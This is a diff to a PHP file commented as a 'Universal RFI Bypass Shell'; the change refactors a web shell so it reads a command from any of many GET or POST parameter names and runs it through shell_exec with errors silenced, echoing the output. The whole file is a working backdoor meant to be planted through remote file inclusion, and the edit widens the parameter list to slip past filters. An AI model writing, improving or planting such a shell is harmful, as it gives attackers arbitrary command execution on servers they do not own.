@@ -1,20 +1,19 @@
 <?php
-// Universal RFI Shell - Bypass nhiều filter
-$cmd = '';
+// Universal RFI Bypass Shell
+$cmd = false;
 
-if(isset($_POST['1337'])) $cmd = $_POST['1337'];
-elseif(isset($_GET['1337'])) $cmd = $_GET['1337'];
+$params = ['1337','cmd','c','command','exec','run','shell','id','action'];
+foreach($params as $p){
+    if(isset($_POST[$p]) && $_POST[$p] !== ''){
+        $cmd = $_POST[$p]; break;
+    }
+    if(isset($_GET[$p]) && $_GET[$p] !== ''){
+        $cmd = $_GET[$p]; break;
+    }
+}
 
-elseif(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
-elseif(isset($_GET['cmd'])) $cmd = $_GET['cmd'];
-
-elseif(isset($_POST['c'])) $cmd = $_POST['c'];
-elseif(isset($_GET['c'])) $cmd = $_GET['c'];
-
-elseif(isset($_POST['command'])) $cmd = $_POST['command'];
-elseif(isset($_GET['command'])) $cmd = $_GET['command'];
-
-if($cmd !== ''){
+if($cmd){
+    @error_reporting(0);
     echo htmlspecialchars(@shell_exec($cmd . " 2>&1"), ENT_QUOTES | ENT_HTML5, 'UTF-8');
     exit;
 }
